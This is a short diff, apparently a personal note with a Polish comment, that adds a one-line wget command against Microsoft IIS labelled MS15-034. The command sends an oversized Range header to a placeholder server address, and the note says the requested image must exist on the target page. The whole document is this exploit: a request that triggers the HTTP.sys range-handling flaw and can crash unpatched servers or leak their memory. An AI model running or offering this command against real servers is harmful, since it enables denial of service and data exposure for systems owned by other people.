@@ -1,0 +1,3 @@
+MS15-034
+wget --header="Range: bytes=18-18446744073709551615" https://xxx.xxx.xxx.xxx/iis-85.png --no-check-certificate
+iis-85.png jest elementem znajdującym się na tej stronie (musi istnieć)
